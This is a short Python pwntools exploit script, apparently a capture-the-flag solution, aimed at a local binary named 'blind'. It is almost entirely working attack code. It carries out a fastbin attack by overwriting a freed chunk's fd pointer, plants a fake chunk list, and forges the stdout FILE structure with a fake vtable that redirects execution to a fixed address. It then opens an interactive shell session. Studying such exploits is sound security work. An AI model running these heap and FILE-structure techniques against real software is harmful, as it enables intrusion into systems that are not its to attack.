# Use FastbinAttack to control a fd pointer
# Alloc a chunk to make a fake chunklist
# Use fake chunklist to falsify *(struct IO_FILE*)stdout and make a new vtable
from pwn import *

context.os='linux'
context.arch='amd64'
r=process('./blind')

def new(index,content):
	r.sendlineafter('Choice:','1')
	r.sendlineafter('Index:',str(index))
	r.sendlineafter('Content:',content)
def change(index,content):
	r.sendlineafter('Choice:','2')
	r.sendlineafter('Index:',str(index))
	r.sendlineafter('Content:',content)
def delete(index):
	r.sendlineafter('Choice:','3')
	r.sendlineafter('Index:',str(index))

file1=[0x00000000fbad2887]
#_flags
file2=[0x1,0xffffffffffffffff,0xb000000,0x602300,0xffffffffffffffff,0,0x602400,0,0,0]
#_fileno+_flags2,_old_offset,_cur_column+_vtable_offset+_shortbuf,_lock,_offset,_codecvt,_wide_data,_freeres_list,_freeres_buf,__pad5
file3=[0xffffffff,0,0,0x602200]
#_mode,_unused2...,vtable
fake_chunklist='\x00'*0x13+p64(0x602060)+p64(0x602100)+p64(0x602170)+p64(0x6021c0)+p64(0x602200)+p64(0x602020)
fake_chunklist=fake_chunklist.ljust(0x60,'\x00')

new(0,'aaaa')
delete(0)
change(0,p64(0x60203d))
new(1,'bbbb')
new(5,fake_chunklist)
change(1,flat(file1))
change(2,flat(file2))
change(3,flat(file3))
change(4,p64(0x4008e3)*12)
change(5,p64(0x602100))#falsify stdout

r.interactive()
